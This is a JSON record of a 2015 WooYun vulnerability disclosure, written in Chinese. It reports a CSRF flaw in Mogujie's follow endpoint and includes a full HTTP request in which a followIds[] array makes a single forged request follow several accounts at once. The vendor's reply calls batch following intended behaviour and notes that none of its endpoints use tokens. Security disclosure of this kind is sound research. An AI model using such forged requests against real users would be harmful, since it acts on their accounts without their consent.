{"id": 47342, "wybug_id": "wooyun-2015-094162", "wybug_title": "蘑菇街CSRF可批量增加粉丝", "wybug_corp": "蘑菇街", "wybug_author": "白加黑", "wybug_date": "2015-01-27 13:39", "wybug_open_date": "2015-01-28 10:55", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["类型应用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 前几天，一能力不错的朋友投你们的安全工程师，直接被HR刷了，真不知道门槛有多高啊～没事继续测测，发现一个CSRF，是在关注他人的地方，起初以为是一个简单的CSRF，但是发现变量参数里的[],猛然发现可以批量关注啊～ 详细说明：  \nPOST /collect/addfollow HTTP/1.1Host: www.mogujie.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.mogujie.com/Content-Length: 112Cookie: Connection: keep-alivePragma: no-cacheCache-Control: no-cachefollowIds%5B%5D=180btq&followIds%5B%5D=11gcqm&followIds%5B%5D=15im8&followIds%5B%5D=15ckg&followIds%5B%5D=12sute\n这种被利用后可以批量关注别人。如果一个恶意钓鱼者，利用这个CSRF，批量关注了几个账号，然后用这些账号推广产品或者钓鱼，应该也是可以的吧～   漏洞证明：  \n\n\n\n   修复方案：  全局sessionID使用了httponly，对于外域确实不好利用，但是这种csrf一旦在站内被利用，风险也是不小的，加固方案你懂的   版权声明：转载请注明来源 白加黑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-28 10:55 厂商回复： 感谢关注蘑菇街安全，该接口产品定义是可以批量关注的。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-28 13:38 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  他意思是你这个地方缺token    \n     2015-01-28 15:39 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  蘑菇街不是一直在招人么～    \n     2015-01-28 17:36 |    \t\t蘑菇街(乌云厂商)\t\t \n  @xsser 是的，这个跟@白加黑沟通过。我们目前所有接口都没有Token，目前不关注影响范围不大的CSRF    \n     2015-01-28 19:30 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @蘑菇街 了解了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}